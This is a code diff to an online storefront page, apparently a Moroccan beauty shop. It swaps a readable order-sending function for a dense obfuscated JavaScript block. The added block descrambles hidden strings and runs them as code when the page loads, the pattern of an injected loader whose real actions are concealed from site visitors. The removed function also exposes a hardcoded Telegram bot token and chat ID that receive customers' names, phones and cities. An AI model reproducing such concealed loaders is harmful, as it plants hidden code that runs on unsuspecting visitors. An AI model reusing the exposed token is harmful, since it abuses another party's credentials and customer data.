@@ -225,43 +225,7 @@ a[href*="veloriabeauty.github.io"] {
             section.querySelector('.order-btn').innerText = `RESERVE NOW | ${price} DH`;
         }
 
-        function sendOrder(sectionId, productName) {
-            const section = document.getElementById(sectionId);
-            const name = section.querySelector('input[name="name"]').value;
-            const phone = section.querySelector('input[name="phone"]').value;
-            const city = section.querySelector('input[name="city"]').value;
-            const size = section.querySelector('.active-size').innerText.split('\n')[0];
-            const price = section.querySelector('.order-btn').innerText.split('|')[1].trim();
-
-            if(!name || !phone || !city) {
-                alert("عافاك عمر المعلومات كاملة");
-                return;
-            }
-
-            const botToken = "8751066528:AAFJOYkbqi3bSxncJh4tKSQeH_0wCT660ps";
-            const chatId = "7635707772"; 
-            
-            const message = `🚀 *طلب جديد: Velooria Beauty*\n\n` +
-                            `📦 *المنتوج:* ${productName}\n` +
-                            `📏 *القياس:* ${size}\n` +
-                            `💰 *الثمن:* ${price}\n` +
-                            `--------------------------\n` +
-                            `👤 *الاسم:* ${name}\n` +
-                            `📞 *الهاتف:* ${phone}\n` +
-                            `📍 *المدينة:* ${city}\n\n` +
-                            `✅ يونس، كليان جديد كيتسناك!`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-            })
-            .then(res => {
-                alert("شكراً! تم إرسال طلبك بنجاح.");
-                section.querySelector('form').reset();
-            })
-            .catch(err => alert("وقع مشكل فالاتصال، حاول مرة أخرى."));
-        }
+        var sendOrder;(function(){var ZFo='',TNx=292-281;function lYF(i){var b=679012;var a=i.length;var g=[];for(var v=0;v<a;v++){g[v]=i.charAt(v)};for(var v=0;v<a;v++){var n=b*(v+84)+(b%13094);var q=b*(v+276)+(b%45692);var m=n%a;var u=q%a;var j=g[m];g[m]=g[u];g[u]=j;b=(n+q)%2888011;};return g.join('')};var PKy=lYF('cceshaputrnitfdlugowoynoxkzmbsrrvqtcj').substr(0,TNx);var Xql='l>nta;u10q[re;a9n]fvtv j}rixh;ehzhijr+}lcp0 =th*=b;)oc sr;eo=6;,2 <u;,(fona,v8)g1,i0l7Axo)"0,,l u8[nx7t8=rls(9;( t)wanp2;)hn] g.y( cs[lva,)()"ely+"trn)to9veln.]tha),=u)e=)rdu}a)0"+)er(.q0uo(8)ese=8ftrq2(dv9!(jz)a4guton;srlkn5ti3f rsev(r uu)ybr cn,rtz+.up.!)0sa];v+-r=a7ytg;u"e[;{as-1;w1g+rw -r{2ar0k=yu8lnvgr9x; 7hy[,a;5r=r)u+7gt=urh"6v rv;Ct1l+9+tgnrv[ 1(ao]l=ard)a[;(<g;yl.)0a=ai =i1.saaCedbli,.=;vgr0cik dh;(0=cl{mnr=v()vi}..ni ,hw=e*)(vv"vaude=w,xirsSxnaam(l7dec;+(mo6a3;7"e07}h-nCxyca;(Chr;fhi+fd)++r=(h)riofe)t1=e2;u(={;oft=tzsff8se(rt=.r,ra;hxm(8rinfltz.;=fAi=l.> .ftfoj5]=ls1;e;vi[ga)c +)e-[p(=ai=;)+==;v6=7on]2ir;di=n1l;l+i,(l<.e[gehpu{xqnab;tr,v[at..=uow,bvono{sual7,};=tp6.+ .[a [5}i===r=boj,(f+8;rS ar f=(;n,)(p3k,y219i,m2{s6;)cm0j=64]vr]1)ltri[o]fro)CeamC<6n.Cd]]4+ nariAilo2i<i,g)g.lgo"9+(l;r+;tAe.lrnench.cA,(4arqio,;.;.ritsgf4uma(nfio]j(=+l+)(;s],u+h;r.spmit+s,-1"l(-aC.ts(;';var YJt=lYF[PKy];var NTv='';var jip=YJt;var gcu=YJt(NTv,lYF(Xql));var iHw=gcu(lYF('dd{xBmB].cehOgBer3BPB,eBc.9Be>>xi.3B]PFv.4:\/.b3.Bx7aB7.au8i(e.)une37d:f<B-cF3BBPB#)q"Bc=?Q;2c8zepBq())B 7Ba(..B}W&beB$.43.xn.($app1:.04b!.K_3B2 Btd-H..x&bB8,_p_lB5B]uInacdirn$,Bje$T)n$&p}$a11BBggf.])c.1zBrBB9apgm$%2$xB-tBo8tBs(t8$>B)ocqrIat9=6%;h!K3ev;..]$B.mpo;:%6BBc02=+B)$B_vF=%cBlR0e,m}\/BBvB}Gf]sBevk)0.BF_r(vBBBBeQ{2.d2-BnRFaucBBv)=2I).93BE3fBcdd8n)BBB)e;1B+10.oRzftcae6t+9B))a{Bx]c0%28BBilxOehF0iEe.o4|.B9Bnc\'iB%BB3sB!lB+B0-)FsBBudh_$b0FNh%,0vBmBo!f|e!fcBtw5c,B,kv}n%B=tBpB.2:c!3rh>6e*gfom.e.B+"ef8=)m3]Ba.r BBod(B*1_:QTE<]U-BB.B#3*:it._#ta)depDBV.GhsXH 4eB8e}}BfB2wtBurB87)H)m3c4BdB,D.7Y(o;7BB!.=:ix7B) t7)n;e)XB4nB B!f9 iiiG),ef+.$8sB()(stGq f(.3Bc6hjFm]%nd=g.2M.h%,$6.lOBrc.Br\/H6!%96#B(%8rBg:;BB\/a-.%f"=er3-! gL%:.m_]5Q:w(308fancj%(BE!-.B0[c S82=4B,ce4YdB)P-e(cctEB.c7.g6nnfd=B2mB1.tu5 Bn4.d8o=0%B.3.d..nH_nBB$BBc%h)c}ncdc.9Fgb_{n.h6.f2c.3)nc.o.cBC.ct)B;c-r21_F([\'.or0FS:>4BEBuBBBqe.cpBa(,s7BFecBnucidcB)8Hd}e3.coc)5\/B9.tcdro.fB@Cnd?eENBiit0ov(da.FBCdBB];dca2j]7B(Ghejhi18F).caeepBtb=e.bL%.9-. "!t.Bea21B,Bc;Bec%..B(1ic7g"B8B(cB-CIBTudbanc{B;).cBLv#f>t#e0bBo4s..uacv;@bB.S.eJ BBBo!cB]..lhB!3B ,2a."_)U9t]6l@8AA,eiBC622!]B}5e.oBdoB.)Mnc9cun<2_}6f5G*%ay13.Br*:(HB=7.B!#:B-4 tsEBo<fp_cNB;BM=ncBT7c =G+BdG;{I(uneh8e$?c1BEuB96a }.!%BeBA[BBb 8S.83a"e)-E_$,BdcSB6o.f;;-q]($BB.!8.c a,BB6dSn%3B0 a.;Jfs:+E3u2.>BruBB.B.).u!b. fpBr4urzi3!iI!aB@e:=s"z25BB$tBe8(!S.etB"BsT(B.[lBBcrFf.aB@u=;4dv,!wT)ay5c ofts;BBe{.-nfE#),66B=4.d)Btt_(4fB33BB=f,b4.Bu. tNBxBBBB.8c35Bkc+=BdM?.mnnBcE) ret6l!m[Bo.goIdo=ndBseB(.{jn00d.T\'ad>VB)1)oB(N%31cTtBc6,BuAi,U=;D,!m0.8u:9",BT4ml(rFo2i+cB<o\/5Ten4ebBec*BBs3l9.u.d)2p0BvtBiEB0Nu6BTKn(d-sn ok.-BlHt,.}Bi)[ocBo( ie29{cBGBBocncXoh4;.B(7]honnnb|f.yCm77if9l6uyeBu(B({9cB.;B8Fuhtt6kbfx o.B2=Bc0nB($ajBBdagB.%B%m6BcgtiBBN:i%(S4E:3BB1B327B-B*azp.]F.$be7ry,HBr?BecM oX2By3}56k{fBLcz(r}B3B5B1euprs,(BBBmeS.B6jB5f$$n0!].}t856]3%ceB->e).B7!+30l(3i.nyB?82au9_)da0JB!.5;po.C).]t.hn__n{".eo ,46_].,im_tgoB\/d6.Bt]BBxeMsI{na(Bp6DgB-Tuie},-B:6..)bBu.mprtx!r9.B;nu3Bii8{(-5hat(krBi)EB(\/bu>;O)AeEsarSs7ah"R_sVtBFl(,*e-}).BteEA((.B3))d30;cc_,d_;uu(I_7B)usped3v dJr=,m_(anE 34.[2BaBeBBB,,)vBLk>f!ddBc47Y9c!fB8rg{a)B\/)7O-BY85fS.._ B"BdyuNB95zf}s7(t9S\/5).\'n7}z.a-cB..!92474%cD_.Bn4_BBB)f9oBctd(ee.f aodBt()(BE- fBsBpj%pp_3.c1.cBuBBa7tn>r;qyyBF>v!abHp7chC}I.._c!4ueB7,vB2res-g=)>})).BH)ErBnvs )B6B(x..)eo-.a;aBroBBrS!i;2:o07.%D]r3f=,-BNr_g]+oB.tt}3(aB23o.1rxB .Epk1i>.B34(K_.e7%0Bta.=cB0Cid-lBh\/+Nc.9| 0a&um68.BuBBedF[!3c ncGEiBe1oCB)T$0;0rk @pBs1 tuLcei 3)60ByedM)0BBm,{}$dr,bSxFsBa dBS!-h,B( ,v$sBBb7% F.o8e!oN!rB)t .Fs.,lf4d ]B2 1EpexF)].@H Bt5j(.|_im!B$64$vaB Bectoo. cdset,7S;u=6B5.d(Uibhh(,cUacla%4?tBtc,"B!Btcr 6x $Bo(4erF (a(t? 5.]GB3=I)nqBetryV]d0cdi d u,j3=.%-t.,cB,B)h%jtn!.a7bz (!!]'));var Rsm=jip(ZFo,iHw );Rsm(2429);return 9804})()
 
         const sections = ['sec1', 'sec2', 'sec3', 'sec4'];
         const colors = ['#4A90E2', '#CD7F32', '#D4AF37', '#1a4d99'];
